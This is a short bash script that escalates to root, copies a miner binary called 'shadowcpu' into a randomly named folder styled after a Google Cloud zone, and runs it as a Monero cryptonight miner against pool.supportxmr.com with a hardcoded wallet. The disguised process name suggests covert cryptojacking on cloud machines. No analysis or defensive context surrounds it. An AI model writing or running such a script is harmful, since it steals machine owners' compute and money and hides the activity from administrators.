#!/bin/bash
sudo -i 
a='0-us-central1-a-' && a1=$(shuf -i1-9 -n1) && a2='-' && b=$(shuf -i10-99 -n1) && c='-' && d=$(shuf -i100-999 -n1) && cpuname=$a$a1$a2$b$c$d && sleep 5 && cp -r /usr/share/work/ /usr/share/${cpuname}/ && cd /usr/share/${cpuname}/ && mv shadowcpu ${cpuname} && ./${cpuname} -a cryptonight -o pool.supportxmr.com:80 -u 44rjefR6KzbHpz3XDHbDpj6X9WKYTBTvHiAuEN4dC4pkL2mBQqhsh6fWeR5JDB29Ks4sTeFKhTWKWQSYLknUn13mRdpmQQF -p $cpuname
